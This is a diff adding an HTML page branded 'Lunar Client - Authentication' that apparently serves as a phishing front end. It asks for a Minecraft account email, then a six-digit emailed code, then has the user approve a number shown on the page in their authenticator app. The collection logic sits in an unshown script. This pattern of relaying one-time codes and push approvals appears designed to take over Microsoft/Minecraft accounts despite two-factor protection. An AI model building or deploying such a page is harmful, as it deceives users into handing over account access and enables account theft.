@@ -1,0 +1,560 @@
+<html lang="en">
+    <head>
+<meta name="csrf-token" content="1a4a530500b10938915d449d8b3543cee828148f05aac87841c40fc107a3106a">
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Lunar Client - Authentication</title>
+        <style>
+            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+
+            
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+
+            body {
+                font-family:
+                    'Inter',
+                    -apple-system,
+                    BlinkMacSystemFont,
+                    sans-serif;
+                background: #0a0e17;
+                min-height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                overflow: hidden;
+                position: relative;
+            }
+
+            .grid-bg {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-image:
+                    linear-gradient(rgba(88, 101, 242, 0.03) 1px, transparent 1px),
+                    linear-gradient(90deg, rgba(88, 101, 242, 0.03) 1px, transparent 1px);
+                background-size: 50px 50px;
+                animation: gridMove 20s linear infinite;
+                z-index: 0;
+            }
+
+            @keyframes gridMove {
+                0% {
+                    transform: translate(0, 0);
+                }
+
+                100% {
+                    transform: translate(50px, 50px);
+                }
+            }
+
+            .orb {
+                position: fixed;
+                border-radius: 50%;
+                filter: blur(100px);
+                opacity: 0.3;
+                z-index: 0;
+            }
+
+            .orb1 {
+                width: 600px;
+                height: 600px;
+                background: radial-gradient(circle, #5865f2, transparent);
+                top: -300px;
+                right: -200px;
+                animation: float1 20s infinite;
+            }
+
+            .orb2 {
+                width: 500px;
+                height: 500px;
+                background: radial-gradient(circle, #7289da, transparent);
+                bottom: -250px;
+                left: -150px;
+                animation: float2 15s infinite;
+            }
+
+            @keyframes float1 {
+                0%,
+                100% {
+                    transform: translate(0, 0) scale(1);
+                }
+
+                50% {
+                    transform: translate(-50px, 50px) scale(1.1);
+                }
+            }
+
+            @keyframes float2 {
+                0%,
+                100% {
+                    transform: translate(0, 0) scale(1);
+                }
+
+                50% {
+                    transform: translate(50px, -50px) scale(1.1);
+                }
+            }
+
+            .container {
+                position: relative;
+                z-index: 1;
+                width: 90%;
+                max-width: 440px;
+            }
+
+            .auth-card {
+                background: rgba(16, 20, 31, 0.7);
+                backdrop-filter: blur(40px);
+                border-radius: 16px;
+                padding: 48px;
+                border: 1px solid rgba(88, 101, 242, 0.1);
+                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+                animation: fadeInUp 0.5s ease-out;
+            }
+
+            @keyframes fadeInUp {
+                from {
+                    opacity: 0;
+                    transform: translateY(20px);
+                }
+
+                to {
+                    opacity: 1;
+                    transform: translateY(0);
+                }
+            }
+
+            .logo-container {
+                text-align: center;
+                margin-bottom: 40px;
+            }
+
+            .logo {
+                width: 96px;
+                height: 96px;
+                margin: 0 auto 24px;
+                margin-bottom: 12px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                position: relative;
+            }
+
+            .logo svg {
+                width: 36px;
+                height: 36px;
+                fill: white;
+            }
+
+            h1 {
+                color: #ffffff;
+                font-size: 32px;
+                font-weight: 800;
+                margin-bottom: 8px;
+                letter-spacing: -1px;
+            }
+
+            .subtitle {
+                color: #8e9aaf;
+                font-size: 15px;
+                font-weight: 500;
+            }
+
+            .form-section {
+                margin-top: 32px;
+            }
+
+            .input-group {
+                margin-bottom: 24px;
+            }
+
+            label {
+                display: block;
+                color: #c9d1d9;
+                font-size: 13px;
+                font-weight: 600;
+                margin-bottom: 8px;
+                text-transform: uppercase;
+                letter-spacing: 0.5px;
+            }
+
+            .input-wrapper {
+                position: relative;
+            }
+
+            .input-wrapper input,
+            .otp-input {
+                width: 100%;
+                padding: 14px 16px;
+                background: rgba(30, 35, 48, 0.6);
+                border: 1.5px solid rgba(88, 101, 242, 0.2);
+                border-radius: 10px;
+                color: #ffffff;
+                font-size: 15px;
+                font-weight: 500;
+                transition: all 0.2s ease;
+                outline: none;
+                font-family: 'Inter', sans-serif;
+            }
+
+            .input-wrapper input:hover,
+            .otp-input:hover {
+                border-color: rgba(88, 101, 242, 0.5);
+            }
+
+            .input-wrapper input:focus,
+            .otp-input:focus {
+                border-color: #5865f2;
+                background: rgba(30, 35, 48, 0.8);
+                box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.25);
+            }
+
+            .input-wrapper input::placeholder {
+                color: #586069;
+                font-weight: 400;
+            }
+
+            .verify-button {
+                width: 100%;
+                padding: 14px;
+                background: linear-gradient(135deg, #5865f2 0%, #4752c4 100%);
+                border: none;
+                border-radius: 10px;
+                color: white;
+                font-size: 15px;
+                font-weight: 700;
+                cursor: pointer;
+                transition: all 0.2s ease;
+                text-transform: uppercase;
+                letter-spacing: 0.5px;
+                box-shadow: 0 4px 16px rgba(88, 101, 242, 0.3);
+                position: relative;
+                overflow: hidden;
+            }
+
+            .verify-button:disabled {
+                opacity: 0.6;
+                cursor: not-allowed;
+            }
+
+            .verify-button::before {
+                content: '';
+                position: absolute;
+                top: 0;
+                left: -100%;
+                width: 100%;
+                height: 100%;
+                background: linear-gradient(
+                    90deg,
+                    transparent,
+                    rgba(255, 255, 255, 0.2),
+                    transparent
+                );
+                transition: left 0.5s ease;
+            }
+
+            .verify-button:hover:not(:disabled) {
+                transform: translateY(-1px);
+                box-shadow: 0 6px 20px rgba(88, 101, 242, 0.4);
+                background: linear-gradient(135deg, #6b75f7 0%, #5865f2 100%);
+            }
+
+            .verify-button:hover:not(:disabled)::before {
+                left: 100%;
+            }
+
+            .verify-button:active:not(:disabled) {
+                transform: translateY(0);
+            }
+
+            .divider {
+                display: flex;
+                align-items: center;
+                margin: 24px 0;
+                color: #586069;
+                font-size: 13px;
+                font-weight: 500;
+            }
+
+            .divider::before,
+            .divider::after {
+                content: '';
+                flex: 1;
+                height: 1px;
+                background: rgba(88, 101, 242, 0.1);
+            }
+
+            .divider span {
+                padding: 0 16px;
+            }
+
+            .footer-links {
+                text-align: center;
+                margin-top: 24px;
+            }
+
+            .footer-links a {
+                color: #8e9aaf;
+                text-decoration: none;
+                font-size: 14px;
+                font-weight: 500;
+                transition: color 0.2s ease;
+            }
+
+            .footer-links a:hover {
+                color: #5865f2;
+            }
+
+            .footer-links a span {
+                color: #5865f2;
+                font-weight: 600;
+            }
+
+            .status-badge {
+                display: inline-flex;
+                align-items: center;
+                gap: 6px;
+                padding: 6px 12px;
+                background: rgba(35, 209, 96, 0.1);
+                border: 1px solid rgba(35, 209, 96, 0.2);
+                border-radius: 20px;
+                margin-top: 24px;
+                font-size: 12px;
+                font-weight: 600;
+                color: #23d160;
+            }
+
+            .status-dot {
+                width: 6px;
+                height: 6px;
+                background: #23d160;
+                border-radius: 50%;
+                animation: statusPulse 2s infinite;
+            }
+
+            @keyframes statusPulse {
+                0%,
+                100% {
+                    opacity: 1;
+                    box-shadow: 0 0 0 0 rgba(35, 209, 96, 0.4);
+                }
+
+                50% {
+                    opacity: 0.8;
+                    box-shadow: 0 0 0 4px rgba(35, 209, 96, 0);
+                }
+            }
+
+            .alert {
+                padding: 14px 16px;
+                border-radius: 10px;
+                margin-bottom: 20px;
+                display: none;
+                align-items: center;
+                gap: 12px;
+                font-size: 14px;
+                font-weight: 500;
+                animation: slideDown 0.3s ease-out;
+            }
+
+            .alert.show {
+                display: flex;
+            }
+
+            @keyframes slideDown {
+                from {
+                    opacity: 0;
+                    transform: translateY(-10px);
+                }
+
+                to {
+                    opacity: 1;
+                    transform: translateY(0);
+                }
+            }
+
+            .alert-error {
+                background: rgba(237, 66, 69, 0.1);
+                border: 1.5px solid rgba(237, 66, 69, 0.3);
+                color: #ed4245;
+            }
+
+            .alert-icon {
+                width: 20px;
+                height: 20px;
+                flex-shrink: 0;
+            }
+
+            .alert-content {
+                flex: 1;
+                line-height: 1.5;
+            }
+
+            .alert-title {
+                font-weight: 700;
+                margin-bottom: 4px;
+            }
+
+            .alert-message {
+                font-size: 13px;
+                opacity: 0.95;
+            }
+
+            .otp-group {
+                display: flex;
+                justify-content: center;
+                gap: 10px;
+                margin-bottom: 24px;
+            }
+
+            .otp-input {
+                width: 48px;
+                height: 52px;
+                font-size: 20px;
+                text-align: center;
+                padding: 0;
+            }
+
+            .auth-app-entropy {
+                text-align: center;
+                font-size: 48px;
+                font-weight: 800;
+                color: #fff;
+                margin: 20px 0;
+                letter-spacing: 4px;
+            }
+
+            .auth-app-instruction {
+                text-align: center;
+                color: #8e9aaf;
+                font-size: 15px;
+                font-weight: 500;
+            }
+
+            .hidden {
+                display: none !important;
+            }
+
+            @media (max-width: 480px) {
+                .auth-card {
+                    padding: 32px 24px;
+                }
+
+                h1 {
+                    font-size: 28px;
+                }
+
+                .otp-input {
+                    width: 40px;
+                    height: 46px;
+                }
+            }
+        </style>
+    </head>
+
+    <body>
+        <div class="grid-bg"></div>
+        <div class="orb orb1"></div>
+        <div class="orb orb2"></div>
+
+        <div class="container">
+            <div class="auth-card">
+                <div class="logo-container">
+                    <div class="logo" id="logo-icon">
+                        <img src="" alt="Client Logo" style="height: 100%; border-radius: 5px" />
+                    </div>
+                    <h1 id="client-name">Lunar Client</h1>
+                    <p class="subtitle" id="subtitle">Verify your account</p>
+                </div>
+
+                <form id="authForm">
+                    <div class="alert alert-error" id="errorAlert">
+                        <svg class="alert-icon" viewBox="0 0 24 24" fill="currentColor">
+                            <path
+                                d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"
+                            ></path>
+                        </svg>
+                        <div class="alert-content">
+                            <div class="alert-title" id="errorTitle"></div>
+                            <div class="alert-message" id="errorMessage"></div>
+                        </div>
+                    </div>
+
+                    <div class="form-section">
+                        <!-- Email Step -->
+                        <div class="input-group" id="emailStep">
+                            <label for="email">Minecraft Email</label>
+                            <div class="input-wrapper">
+                                <input
+                                    type="email"
+                                    id="email"
+                                    placeholder="Enter your Minecraft account email"
+                                    required
+                                    autocomplete="off"
+                                />
+                            </div>
+                        </div>
+
+                        <!-- OTP Step -->
+                        <div class="input-group hidden" id="otpStep">
+                            <label>Enter the 6-digit code</label>
+                            <p
+                                id="otpEmailDisplay"
+                                style="
+                                    text-align: center;
+                                    color: #8e9aaf;
+                                    font-size: 14px;
+                                    margin-top: 5px;
+                                    margin-bottom: 7px;
+                                "
+                            ></p>
+                            <div class="otp-group" id="otpGroup">
+                                <input type="text" class="otp-input" maxlength="1" data-index="0" />
+                                <input type="text" class="otp-input" maxlength="1" data-index="1" />
+                                <input type="text" class="otp-input" maxlength="1" data-index="2" />
+                                <input type="text" class="otp-input" maxlength="1" data-index="3" />
+                                <input type="text" class="otp-input" maxlength="1" data-index="4" />
+                                <input type="text" class="otp-input" maxlength="1" data-index="5" />
+                            </div>
+                        </div>
+
+                        <!-- Auth App Step -->
+                        <div class="input-group hidden" id="authAppStep">
+                            <label>Authenticator App</label>
+                            <p class="auth-app-instruction">
+                                Please select the number shown below in your authenticator app.
+                            </p>
+                            <div class="auth-app-entropy" id="entropy"></div>
+                        </div>
+
+                        <button type="submit" class="verify-button" id="submitBtn">Verify</button>
+
+                        <!--<div style="text-align: center">
+                            <div class="status-badge">
+                                <div class="status-dot"></div>
+                                <span>All Systems Operational</span>
+                            </div>
+                        </div>-->
+                    </div>
+                </form>
+
+                <div class="divider">
+                    <span>or</span>
+                </div>
+
+                <div class="footer-links">
+                    <a href="/support" target="_blank">Need help? <span>Contact Support</span></a>
+                </div>
+            </div>
+        </div>
+
+        <script src="/main.js" defer></script>
+    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"3dbbc8acbdbb4c169720231282902288","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
